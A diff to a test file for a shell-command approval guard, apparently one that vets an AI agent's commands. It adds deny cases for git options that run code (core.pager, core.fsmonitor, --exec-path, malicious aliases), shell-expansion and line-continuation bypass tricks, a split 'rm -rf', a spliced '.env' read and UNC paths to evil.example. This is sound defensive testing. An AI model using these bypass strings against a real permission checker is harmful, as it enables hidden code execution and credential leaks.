@@ -2068,6 +2068,97 @@ SB4_INLINE = [
 ]
 CASES += SB4_INLINE
 
+# Ledger S-B8 (2026-11-05): a git global option that runs code (-c, -c<k=v>, --config-env,
+# --exec-path) is denied with GIT_CODE_REASON (checked in main); the removed settings allow
+# `git -C * status*` (and log, branch --show-current) would approve it (2.1.318 warns so).
+SB8_GIT = [
+    ('git -C . --exec-path=/tmp/evil branch --show-current', 'deny'),
+    ('git -C . --exec-path=/tmp/evil status', 'deny'),
+    ("git -C . -c core.pager='touch pwned' branch --show-current", 'deny'),
+    ("git -C . -c core.pager='touch pwned' log -1", 'deny'),
+    ('git -c core.editor=vim status', 'deny'),
+    ('git -c core.quotepath=off status', 'deny'),       # harmless key: accepted over-deny
+    ('git --git-dir=/tmp/x -c core.fsmonitor=evil status', 'deny'),
+    ('git -c core.pager=less log -1', 'deny'),
+    ('git --exec-path=/tmp/evil status', 'deny'),
+    ('git --exec-path status', 'deny'),                 # prints the path: accepted over-deny
+    ('git -ccore.pager=less log -1', 'deny'),
+    ('git --config-env=core.pager=EVIL log -1', 'deny'),
+    ('git --config-env core.pager=EVIL log -1', 'deny'),
+    ('git --attr-source HEAD -c core.pager=less log -1', 'deny'),
+    ("bash -c 'git -C . -c core.fsmonitor=evil status'", 'deny'),
+    ('echo $(git -c core.pager=less log -1)', 'deny'),
+    ('echo `git -c core.pager=less log -1`', 'deny'),
+    ('(git -C . -c core.pager=less log -1)', 'deny'),
+    ('ls && git -c core.pager=less log -1', 'deny'),
+    ('git status | git -c core.pager=less log -1', 'deny'),
+    ('timeout 5 git -c core.pager=less log -1', 'deny'),
+    ('pwsh -NoProfile -Command "git -C . -c core.pager=less log -1"', 'deny'),
+    ('pwsh -NoProfile -Command "& git --exec-path=C:/x status"', 'deny'),
+    ('pwsh -NoProfile -Command "(git -c core.pager=less log -1)"', 'deny'),
+    ("pwsh -NoProfile -Command \"bash -c 'git -c core.pager=less log -1'\"", 'deny'),
+    ('timeout 5 pwsh -NoProfile -Command "git -c core.pager=less log -1"', 'deny'),
+    ("wsl git -c core.pager=less log -1", 'deny'),
+    ("python -c \"import subprocess; subprocess.run(['git', '-c', 'core.pager=x', 'log'])\"",
+     'deny'),
+    ("git -c alias.status='!touch pwned' status", 'deny'),   # the alias scan keeps its reason
+    # a word up to the subcommand that the shell expands into -c: GIT_EXPAND_REASON
+    ("git -C . {-c,core.fsmonitor='touch B; false'} status", 'deny'),
+    ("git -C . {-c,core.fsmonitor='touch B; false'} log -1", 'deny'),
+    ("git -C . $'-c' core.fsmonitor='touch A; false' status", 'deny'),
+    ("git -C . $'-c' core.fsmonitor='touch A; false' log -1", 'deny'),
+    ('git -C . ${X:--c} core.fsmonitor=x status', 'deny'),
+    ('git -C . ${X:--c} core.fsmonitor=x log -1', 'deny'),
+    ('git -C . -[c] core.fsmonitor=x status', 'deny'),
+    ('git -C . -[c] core.fsmonitor=x log -1', 'deny'),
+    ('git -C $D status', 'deny'),                       # D='. -c k=v' word-splits
+    ("wsl git -C /tmp/x $'-c' core.fsmonitor=e status", 'deny'),
+    ('git -C . $SUB', 'deny'),
+    ('pwsh -NoProfile -Command "git -C . $x core.fsmonitor=e status"', 'deny'),
+    ('bash -c "git -C . \\${X:--c} core.fsmonitor=x status"', 'deny'),
+    # a backslash-newline bash removes before it splits words (decide() reads both views)
+    ('git -C . \\\n-c core.fsmonitor=x status', 'deny'),
+    ('git -C . \\\n  -c core.fsmonitor=x log -1', 'deny'),
+    ('git -C . -\\\nc core.fsmonitor=x status', 'deny'),
+    ('git -C . --exec-\\\npath=/tmp/e status', 'deny'),
+    ('git -C . \\\r\n-c core.fsmonitor=x status', 'deny'),
+    ('r\\\nm -rf /tmp/x', 'deny'),                # non-git: the rm -r/-f scan sees rm
+    ('git -C . status \\\n  --short', 'allow'),
+    ("echo 'a\\\nb'", 'allow'),
+    # kept: -C, --git-dir, --work-tree alone, and -c after the subcommand
+    ('git -C . status', 'allow'),
+    ('git -C /tmp/x status', 'allow'),
+    ('git -C /tmp/x log --oneline -3', 'allow'),
+    ('git -C . status --short', 'allow'),
+    ('git -C . branch --show-current', 'allow'),
+    ('git -C . diff', 'allow'),
+    ('git -C . show HEAD', 'allow'),
+    ('git -C . rev-parse HEAD', 'allow'),
+    ('git -C . log -c -1', 'allow'),
+    ("git -C . log --grep='-c core.pager'", 'allow'),   # quoted: not an expansion
+    ("git -C . log --format='git -c x'", 'allow'),
+    ("git -C '{x}' status", 'allow'),
+    ('git --git-dir=/tmp/x status', None),
+    ('git --work-tree=/tmp/x status', None),
+    ('GIT_EXEC_PATH=/tmp/evil git status', None),       # env-prefix residual (docs/SETUP.md)
+]
+CASES += SB8_GIT
+SB8_EXPAND = {                          # expansion rows -> the word GIT_EXPAND_REASON shows
+    "git -C . {-c,core.fsmonitor='touch B; false'} status": '{-c,core.fsmonitor=touch B; false}',
+    "git -C . {-c,core.fsmonitor='touch B; false'} log -1": '{-c,core.fsmonitor=touch B; false}',
+    "git -C . $'-c' core.fsmonitor='touch A; false' status": '$-c',
+    "git -C . $'-c' core.fsmonitor='touch A; false' log -1": '$-c',
+    'git -C . ${X:--c} core.fsmonitor=x status': '${X:--c}',
+    'git -C . ${X:--c} core.fsmonitor=x log -1': '${X:--c}',
+    'git -C . -[c] core.fsmonitor=x status': '-[c]',
+    'git -C . -[c] core.fsmonitor=x log -1': '-[c]',
+    'git -C $D status': '$D', 'git -C . $SUB': '$SUB',
+    "wsl git -C /tmp/x $'-c' core.fsmonitor=e status": '$-c',
+    'pwsh -NoProfile -Command "git -C . $x core.fsmonitor=e status"': '$x',
+    'bash -c "git -C . \\${X:--c} core.fsmonitor=x status"': '${X:--c}',
+}
+SB8_OTHER = {'r\\\nm -rf /tmp/x': 'rm -r/-f'}   # non-git rows -> the scan hit they deny with
+
 
 def write(dirpath, name, body, nl='\n', enc='utf-8'):
     p = os.path.join(dirpath, name)
@@ -3162,7 +3253,8 @@ def main():
                    ('bash k1.sh', None), ('bash n2.sh', None),
                    # A12 sweep: a splice does not hide an ALLOW_STOP token
                    ('cat logs/a""pi-key', None), ("cat logs/api''-key", None), ('cat logs/api\\\n-key', None),
-                   ('cat .e\\\nnv', None), ('bash c1.sh', None), ('bash c2.sh', None),
+                   ('cat .e\\\nnv', 'deny'),          # S-B8: read joined, as bash runs it
+                   ('bash c1.sh', None), ('bash c2.sh', None),
                    # A13 W1: a UNC path (SMB traffic, an NTLM hash to any host) is never allowed
                    ('cat //evil.example/share/x', None), ('ls //evil.example/s', None),
                    ('head \\\\evil.example\\s\\x', None), ('wc -l //evil.example/s/x', None),
@@ -3487,6 +3579,24 @@ def main():
         if not (d and d[0] == 'deny' and 'inline code is not run' not in d[1]):
             fails += 1
             print(f'FAIL S-B4 scan reason kept: {cmd!r}: {d}')
+    for cmd, want in SB8_GIT:               # ledger S-B8: its own reason, the alias scan's kept
+        if want != 'deny':
+            continue
+        n += 1
+        d = g.decide(cmd)
+        if cmd in SB8_EXPAND:
+            want_reason = g.GIT_EXPAND_REASON.format(SB8_EXPAND[cmd])
+        elif cmd in SB8_OTHER:
+            want_reason = g.deny_reason(SB8_OTHER[cmd])
+        elif 'alias.' in cmd:
+            want_reason = g.deny_reason('git -c alias/credential')
+        else:
+            opt = re.search(r'(?<!\S)(-c|--config-env|--exec-path)',
+                            g.CONTINUATION.sub(r'\1', cmd)).group(1)
+            want_reason = g.GIT_CODE_REASON.format(opt)
+        if not (d and d[1] == want_reason):
+            fails += 1
+            print(f'FAIL S-B8 reason: {cmd!r}: {d}')
     k, f = sb4_write_run()
     n += k
     fails += f
